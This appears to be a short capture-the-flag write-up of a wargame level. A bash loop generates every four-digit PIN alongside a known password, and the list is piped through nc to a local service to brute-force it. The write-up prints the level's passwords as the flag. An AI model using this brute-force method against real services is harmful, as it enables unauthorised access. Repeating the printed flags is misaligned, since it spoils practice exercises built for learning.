1 I first created a python script to run through the iterations of the pins, 
  but that took way to long so I killed the session. I could have just gone back and edited the 
  python script to redirect output to a file like I did in the shell script I am about to paste,
  but I didn't think of it till after

2 vi pinbreaker.sh
#!/bin/bash

for i in {000..9999}
do
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}" >> bruteforcedictionary.txt
done

***Note I did take a play out of the John Hammond play book by speeding up the process and sending the
   echoed pins to a file.

3 cat bruteforcedictionary.txt | nc localhost 30002
4 contents revealed "The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG"
5 flag === uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
